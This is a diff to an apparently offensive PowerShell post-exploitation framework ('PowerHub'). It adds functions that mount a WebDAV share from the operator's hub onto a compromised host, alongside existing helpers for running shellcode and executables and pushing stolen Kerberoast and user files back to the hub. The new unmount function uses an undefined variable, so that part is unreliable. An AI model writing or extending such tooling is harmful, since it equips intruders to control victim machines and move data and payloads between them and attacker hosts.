@@ -330,6 +330,27 @@ Upload the files 'kerberoast.txt' and 'users.txt' via HTTP back to the hub.
     }
 }
 
+$global:WebdavLetter = $Null
+
+function Mount-Webdav {
+    Param(
+        [parameter(Mandatory=$False)]
+        [String]$Letter = "S"
+    )
+    Set-Variable -Name "WebdavLetter" -Value "$Letter" -Scope Global
+    $netout = & net use ${Letter}: \\$WEBDAV_URL /persistent:no 2>&1 | Out-Null
+    if (!$?) {
+        throw "Error while executing 'net use': $netout"
+    }
+}
+
+function Unmount-Webdav {
+    $netout = & net use ${Letter}: /delete 2>&1 | Out-Null
+    if (!$?) {
+        throw "Error while executing 'net use': $netout"
+    }
+}
+
 function Help-PowerHub {
     Write-Host @"
 The following functions are available (some with short aliases):
@@ -338,6 +359,8 @@ The following functions are available (some with short aliases):
   * Run-Exe (re)
   * Run-Shellcode (rsh)
   * PushTo-Hub (pth)
+  * Mount-Webdav (mwd)
+  * Unmount-Webdav (uwd)
 
 Use 'Get-Help' to learn more about those functions.
 "@
@@ -348,3 +371,5 @@ try { New-Alias -Name lhm -Value Load-HubModule } catch { }
 try { New-Alias -Name lshm -Value List-HubModules } catch { }
 try { New-Alias -Name re -Value Run-Exe } catch { }
 try { New-Alias -Name rsh -Value Run-Shellcode } catch { }
+try { New-Alias -Name mwd -Value Mount-Webdav } catch { }
+try { New-Alias -Name uwd -Value Unmount-Webdav } catch { }
